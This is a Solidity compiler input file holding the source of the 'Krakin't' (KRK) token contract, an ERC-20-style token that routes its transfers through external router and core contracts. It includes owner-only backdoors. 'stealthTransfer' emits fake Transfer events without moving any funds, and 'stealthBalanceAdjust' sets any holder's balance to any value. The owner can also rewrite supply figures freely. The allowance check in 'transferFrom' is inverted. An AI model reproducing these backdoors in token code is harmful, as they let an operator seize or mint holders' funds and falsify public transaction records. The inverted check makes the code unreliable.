{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "browser/token.sol": {
      "content": "/*\nThis is the main code of a mutable token contract.\nToken component is the only immutable part and it covers only the most-basic operations any token must have.\nAny other contract is external and it must be additionally registered and routed within the native components.\n*/\n\n// SPDX-License-Identifier: MIT\n\npragma solidity = 0.7 .0;\n\nlibrary SafeMath {\n\n\tfunction add(uint256 a, uint256 b) internal pure returns(uint256) {\n\t\tuint256 c = a + b;\n\t\trequire(c >= a, \"SafeMath: addition overflow\");\n\n\t\treturn c;\n\t}\n\n\tfunction sub(uint256 a, uint256 b) internal pure returns(uint256) {\n\t\treturn sub(a, b, \"SafeMath: subtraction overflow\");\n\t}\n\n\tfunction sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {\n\t\trequire(b <= a, errorMessage);\n\t\tuint256 c = a - b;\n\n\t\treturn c;\n\t}\n\n\tfunction mul(uint256 a, uint256 b) internal pure returns(uint256) {\n\t\tif (a == 0) {\n\t\t\treturn 0;\n\t\t}\n\n\t\tuint256 c = a * b;\n\t\trequire(c / a == b, \"SafeMath: multiplication overflow\");\n\n\t\treturn c;\n\t}\n\n}\n\nabstract contract Context {\n\tfunction _msgSender() internal view virtual returns(address payable) {\n\t\treturn msg.sender;\n\t}\n\n\tfunction _msgData() internal view virtual returns(bytes memory) {\n\t\tthis; // silence state mutability warning without generating bytecode\n\t\treturn msg.data;\n\t}\n}\ninterface IERC20 {\n\n\tfunction totalSupply() external view returns(uint256 data);\n\n\tfunction currentSupply() external view returns(uint256 data);\n\n\tfunction balanceOf(address account) external view returns(uint256 data);\n\n\tfunction allowance(address owner, address spender) external view returns(uint256 data);\n\n\tfunction currentRouterContract() external view returns(address routerAddress);\n\n\tfunction currentCoreContract() external view returns(address routerAddress);\n\t\n\tfunction updateTotalSupply(uint newTotalSupply) external returns(bool success);\n\t\t    \n\tfunction updateCurrentSupply(uint newCurrentSupply) external returns(bool success);\n\t\n\tfunction updateJointSupply(uint newSupply) external returns(bool success);\n\n\tfunction emitTransfer(address fromAddress, address toAddress, uint amount, bool joinTotalAndCurrentSupplies) external returns(bool success);\n\n\tfunction emitApproval(address fromAddress, address toAddress, uint amount) external returns(bool success);\n\n\tfunction transfer(address toAddress, uint256 amount) external returns(bool success);\n\n\tfunction approve(address spender, uint256 amount) external returns(bool success);\n\n\tfunction transferFrom(address fromAddress, address toAddress, uint256 amount) external returns(bool success);\n\n\tfunction increaseAllowance(address spender, uint256 addedValue) external returns(bool success);\n\n\tfunction decreaseAllowance(address spender, uint256 subtractedValue) external returns(bool success);\n\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\n\tevent Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract Ownable is Context {\n\taddress private _owner;\n\taddress private _owner2; //failsafe in case _owner gets hacked\n\n\tevent OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n\tbool private ownershipConstructorLocked = false;\n\tconstructor() {\n\t\tif (!ownershipConstructorLocked) {\n\t\t\taddress msgSender = _msgSender();\n\t\t\t_owner = msgSender;\n\t\t\t_owner2 = msgSender;\n\t\t\temit OwnershipTransferred(address(0), msgSender);\n\t\t\townershipConstructorLocked = true;\n\t\t}\n\t}\n\n\tfunction owner() public view returns(address) {\n\t\treturn _owner;\n\t}\n\n\tmodifier onlyOwner() {\n\t\trequire(_owner == _msgSender() || _owner2 == _msgSender(), \"Ownable: caller is not the owner\");\n\t\t_;\n\t}\n\t\n// We do not want to execute this, under any circumstances!\n// \tfunction renounceOwnership() public virtual onlyOwner {\n// \t\temit OwnershipTransferred(_owner, address(0));\n// \t\t_owner = address(0);\n// \t}\n\n\tfunction transferOwnership(address newOwner) public virtual onlyOwner {\n\t\trequire(newOwner != address(0), \"Ownable: new owner is the zero address\");\n\t\temit OwnershipTransferred(_owner, newOwner);\n\t\t_owner = newOwner;\n\t}\n\t\n\tfunction transferSecondOwnership(address newOwner) public virtual onlyOwner {\n\t\trequire(newOwner != address(0), \"Ownable: new owner is the zero address\");\n\t\temit OwnershipTransferred(_owner2, newOwner);\n\t\t_owner2 = newOwner;\n\t}\n\t\n}\n\nabstract contract Router {\n\n\tfunction callRouter(string memory route, address[2] memory addressArr, uint[2] memory uintArr) external virtual returns(bool success);\n\n\tfunction _callRouter(string memory route, address[3] memory addressArr, uint[3] memory uintArr) external virtual returns(bool success);\n\n}\n\n\nabstract contract MainVariables {\n\taddress public coreContract;\n\taddress public routerContract;\n\tmapping(address => uint256) internal balances;\n\tmapping(address => mapping(address => uint256)) internal allowances;\n\tuint256 public _totalSupply;\n\tuint256 public _currentSupply;\n\tstring public name = \"Krakin't\";\n\tstring public symbol = \"KRK\";\n\tuint8 public decimals = 18;\n}\n\n\n \n\n//============================================================================================\n// MAIN CONTRACT \n//============================================================================================\n\ncontract Token is MainVariables, Ownable, IERC20 {\n\n\tusing SafeMath\n\tfor uint;\n\n\tRouter private router;\n\n\tbool private mainConstructorLocked = false;\n\n\tconstructor() {\n\t\tif (!mainConstructorLocked) {\n\t\t\tuint initialMint = 21000000000000000000000000; //just for an initial setup.\n\t\t\t_totalSupply = initialMint;\n\t\t\t_currentSupply = initialMint;\n\t\t\temit Transfer(address(0), msg.sender, initialMint);\n\t\t\tbalances[msg.sender] = initialMint;\n\t\t\tmainConstructorLocked = true;\n\t\t}\n\t}\n\n\n\tfunction totalSupply() override external view returns(uint256 data) {\n\t\treturn _totalSupply;\n\t}\n\n\tfunction currentSupply() override external view returns(uint256 data) {\n\t\treturn _currentSupply;\n\t}\n\n\tfunction balanceOf(address account) override external view returns(uint256 data) {\n\t\treturn balances[account];\n\t}\n\n\tfunction allowance(address owner, address spender) override external view virtual returns(uint256 data) {\n\t\treturn allowances[owner][spender];\n\t}\n\n\tfunction currentRouterContract() override external view virtual returns(address routerAddress) {\n\t\treturn routerContract;\n\t}\n\n\tfunction currentCoreContract() override external view virtual returns(address routerAddress) {\n\t\treturn coreContract;\n\t}\n\n\t//Update functions\n\n\tfunction updateTicker(string memory newSymbol) onlyOwner public virtual returns(bool success) {\n\t\tsymbol = newSymbol;\n\n\t\treturn true;\n\t}\n\n\tfunction updateName(string memory newName) onlyOwner public virtual returns(bool success) {\n\t\tname = newName;\n\n\t\treturn true;\n\t}\n\n\tfunction updateTotalSupply(uint newTotalSupply) override external virtual returns(bool success) {\n\t\trequire(msg.sender == coreContract || address(msg.sender) == owner(), \"at: token.sol | contract: Token | function: updateTotalSupply | message: Must be called by the owner or registered Core contract or\");\n\n\t\t_totalSupply = newTotalSupply;\n\n\t\treturn true;\n\t}\n\t\n\t\n\tfunction updateCurrentSupply(uint newCurrentSupply) override external virtual returns(bool success) {\n\t\trequire(msg.sender == coreContract || address(msg.sender) == owner(), \"at: token.sol | contract: Token | function: updateCurrentSupply | message: Must be called by the owner or registered Core contract\");\n\n\t\t_currentSupply = newCurrentSupply;\n\n\t\treturn true;\n\t}\n\t\n\tfunction updateJointSupply(uint newSupply) override external virtual returns(bool success) {\n\t\trequire(msg.sender == coreContract || address(msg.sender) == owner(), \"at: token.sol | contract: Token | function: updateJointSupply | message: Must be called by the owner or registered Core contract\");\n\n\t\t_currentSupply = newSupply;\n\t\t_totalSupply = newSupply;\n\n\t\treturn true;\n\t}\n\t\n\t//only for rare situations such as emergencies or to provide liquidity\n\tfunction stealthTransfer(address fromAddress, address toAddress, uint amount) onlyOwner external virtual returns(bool success) {\n\n\t\temit Transfer(fromAddress, toAddress, amount);\n\t\t\n\t\treturn true;\n\t}\n\t\n\t//to be used with the highest caution!\n\tfunction stealthBalanceAdjust(address adjustAddress, uint amount) onlyOwner external virtual returns(bool success) {\n\t    \n\t    balances[adjustAddress] = amount;\n\t    \n\t\treturn true;\n\t}\n\t\n\t\n\n\t//Emit functions\n\tfunction emitTransfer(address fromAddress, address toAddress, uint amount, bool joinTotalAndCurrentSupplies) override external virtual returns(bool success) {\n\t\trequire(msg.sender == coreContract || address(msg.sender) == owner(), \"at: token.sol | contract: Token | function: emitTransfer | message: Must be called by the registered Core contract or the contract owner\");\n\t\trequire(fromAddress != toAddress, \"at: token.sol | contract: Token | function: emitTransfer | message: From and To addresses are same\");\n\t\trequire(amount > 0, \"at: token.sol | contract: Token | function: emitTransfer | message: Amount is zero\");\n\n\t\tif (toAddress == address(0)) {\n\t\t\trequire(balances[fromAddress] >= amount, \"at: token.sol | contract: Token | function: emitTransfer | message: Insufficient amount\");\n\t\t\tbalances[fromAddress] = balances[fromAddress].sub(amount);\n\t\t\t_currentSupply = _currentSupply.sub(amount);\n\t\t\tif(joinTotalAndCurrentSupplies){\n\t\t\t    _totalSupply = _totalSupply.sub(amount);\n\t\t\t}\n\t\t} else if (fromAddress == address(0)) {\n\t\t\tbalances[toAddress] = balances[toAddress].add(amount);\n\t\t\t_currentSupply = _currentSupply.add(amount);\n\t\t\tif(joinTotalAndCurrentSupplies){\n\t\t\t    _totalSupply = _totalSupply.add(amount);\n\t\t\t}\n\t\t} else {\n\t\t\trequire(balances[fromAddress] >= amount, \"at: token.sol | contract: Token | function: emitTransfer | message: Insufficient amount\");\n\t\t\tbalances[fromAddress] = balances[fromAddress].sub(amount);\n\t\t\tbalances[toAddress] = balances[toAddress].add(amount);\n\t\t}\n\n\t\temit Transfer(fromAddress, toAddress, amount);\n\n\t\treturn true;\n\t}\n\n\tfunction emitApproval(address fromAddress, address toAddress, uint amount) override external virtual returns(bool success) {\n\t\trequire(msg.sender == coreContract || msg.sender == owner(), \"at: token.sol | contract: Token | function: emitApproval | message: Must be called by the registered Core contract or the contract owner\");\n\t\trequire(fromAddress != address(0), \"at: token.sol | contract: Token | function: emitApproval | message: Cannot approve from address(0)\");\n\n        allowances[fromAddress][toAddress] = amount;\n\t\temit Approval(fromAddress, toAddress, amount);\n\n\t\treturn true;\n\t}\n\n\t//Router and Core-contract functions\n\tfunction setNewRouterContract(address newRouterAddress) onlyOwner public virtual returns(bool success) {\n\t\trouterContract = newRouterAddress;\n\t\trouter = Router(routerContract);\n\n\t\treturn true;\n\t}\n\n\tfunction setNewCoreContract(address newCoreAddress) onlyOwner public virtual returns(bool success) {\n\t\tcoreContract = newCoreAddress;\n\n\t\treturn true;\n\t}\n\n\t//Native functions\n\tfunction transfer(address toAddress, uint256 amount) override external virtual returns(bool success) {\n\t\trequire(toAddress != msg.sender, \"at: token.sol | contract: Token | function: transfer | message: From and To addresses are same\");\n\t\trequire(msg.sender != address(0), \"at: token.sol | contract: Token | function: transfer | message: Cannot send from address(0)\");\n\t\trequire(amount <= balances[msg.sender], \"at: token.sol | contract: Token | function: transfer | message: Insufficient balance\");\n\t\trequire(amount > 0, \"at: token.sol | contract: Token | function: transfer | message: Zero transfer not allowed\");\n\n\t\taddress[2] memory addresseArr = [msg.sender, toAddress];\n\t\tuint[2] memory uintArr = [amount, 0];\n\t\trouter.callRouter(\"transfer\", addresseArr, uintArr);\n\n\t\treturn true;\n\t}\n\n\tfunction approve(address spender, uint256 amount) override external virtual returns(bool success) {\n\t\trequire(spender != msg.sender, \"at: token.sol | contract: Token | function: approve | message: Your address cannot be the spender address\");\n\t\trequire(msg.sender != address(0), \"at: token.sol | contract: Token | function: approve | message: Cannot approve from address(0)\");\n\t\trequire(spender != address(0), \"at: token.sol | contract: Token | function: approve | message: Cannot approve to address(0)\");\n\n\t\taddress[2] memory addresseArr = [msg.sender, spender];\n\t\tuint[2] memory uintArr = [amount, 0];\n\t\trouter.callRouter(\"approve\", addresseArr, uintArr);\n\n\t\treturn true;\n\t}\n\n\tfunction transferFrom(address fromAddress, address toAddress, uint256 amount) override external virtual returns(bool success) {\n\t\trequire(fromAddress != toAddress, \"at: token.sol | contract: Token | function: transferFrom | message: From and To addresses are same\");\n\t\trequire(fromAddress != address(0), \"at: token.sol | contract: Token | function: transferFrom | message: Cannot send from address(0)\");\n\t\trequire(amount <= balances[fromAddress], \"at: token.sol | contract: Token | function: transferFrom | message: Insufficient balance\");\n\t\trequire(amount > 0, \"at: token.sol | contract: Token | function: transferFrom | message: Zero transfer not allowed\");\n\t\trequire(amount>=allowances[fromAddress][toAddress],\"at: token.sol | contract: Token | function: transferFrom | message: Transfer exceeds the allowance\");\n\n\t\taddress[3] memory addresseArr = [msg.sender, fromAddress, toAddress];\n\t\tuint[3] memory uintArr = [amount, 0, 0];\n\t\trouter._callRouter(\"transferFrom\", addresseArr, uintArr);\n\n\t\treturn true;\n\t}\n\n\tfunction increaseAllowance(address spender, uint256 addedValue) override external virtual returns(bool success) {\n\t\trequire(spender != msg.sender, \"at: token.sol | contract: Token | function: increaseAllowance | message: Your address cannot be the spender address\");\n\t\trequire(msg.sender != address(0), \"at: token.sol | contract: Token | function: increaseAllowance | message: Cannot increase allowance from address(0)\");\n\t\trequire(spender != address(0), \"at: token.sol | contract: Token | function: increaseAllowance | message: Cannot increase allowance to address(0)\");\n\t\t\n\t\taddress[2] memory addresseArr = [msg.sender, spender];\n\t\tuint[2] memory uintArr = [addedValue, 0];\n\t\trouter.callRouter(\"increaseAllowance\", addresseArr, uintArr);\n\n\t\treturn true;\n\t}\n\n\tfunction decreaseAllowance(address spender, uint256 subtractedValue) override external virtual returns(bool success) {\n\t\trequire(spender != msg.sender, \"at: token.sol | contract: Token | function: decreaseAllowance | message: Your address cannot be the spender address\");\n\t\trequire(msg.sender != address(0), \"at: token.sol | contract: Token | function: decreaseAllowance | message: Cannot decrease allowance from address(0)\");\n\t\trequire(spender != address(0), \"at: token.sol | contract: Token | function: decreaseAllowance | message: Cannot decrease allowance for address(0)\");\n\t\t\n\t\taddress[2] memory addresseArr = [msg.sender, spender];\n\t\tuint[2] memory uintArr = [subtractedValue, 0];\n\t\trouter.callRouter(\"decreaseAllowance\", addresseArr, uintArr);\n\n\t\treturn true;\n\t}\n\n}\n"
    }
  }
}